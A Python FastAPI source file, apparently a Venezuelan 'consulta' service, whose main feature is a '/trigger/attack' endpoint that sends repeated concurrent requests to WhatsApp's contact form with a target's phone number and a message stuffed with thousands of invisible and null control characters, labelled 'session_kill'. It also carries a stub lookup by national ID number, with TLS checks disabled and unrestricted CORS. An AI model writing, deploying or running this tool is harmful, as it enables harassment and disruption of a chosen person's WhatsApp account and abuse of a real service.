from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import httpx
import asyncio

app = FastAPI(title="API Consulta Venezuela & DRIEMX Engine", version="6.1")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Payload con caracteres de control / secuencias de escape
PAYLOAD_MALFORMADO = "\u200e" * 5000 + " \u0000 JavaScript Locked! \u0000 " * 50

async def enviar_ataque(client, url, telefono):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "phone": telefono,
        "message": PAYLOAD_MALFORMADO
    }
    try:
        response = await client.post(url, data=data, headers=headers, timeout=5.0)
        return {"status": response.status_code}
    except Exception as e:
        return {"error": str(e)}

@app.get("/")
def home():
    return {
        "status": "online",
        "service": "API Consulta Venezuela",
        "endpoints": {
            "cne": "/consultar?tipo=cne&numero=<cedula>",
            "session_kill": "/trigger/attack?phone=<telefono>&count=<cantidad>",
            "status": "active"
        }
    }

@app.get("/consultar")
def consultar(tipo: str = None, numero: str = None):
    if not tipo or not numero:
        raise HTTPException(status_code=400, detail="Parámetros 'tipo' y 'numero' requeridos.")
    
    if tipo.lower() == "cne":
        # Simulación o integración de tu lógica de consulta CNE existente
        return {
            "status": "success",
            "tipo": tipo,
            "numero": numero,
            "resultado": f"Datos recuperados exitosamente para el documento {numero}"
        }
    
    raise HTTPException(status_code=404, detail="Tipo de consulta no soportado.")

@app.get("/trigger/attack")
async def disparar(phone: str, count: int = 10):
    if not phone:
        raise HTTPException(status_code=400, detail="Número objetivo requerido")
        
    url = "https://www.whatsapp.com/contact/noclient/"
    async with httpx.AsyncClient(verify=False) as client:
        tareas = [enviar_ataque(client, url, phone) for _ in range(count)]
        resultados = await asyncio.gather(*tareas)
        
    return {
        "target": phone,
        "total_peticiones": len(resultados),
        "resultados": resultados
    }
    
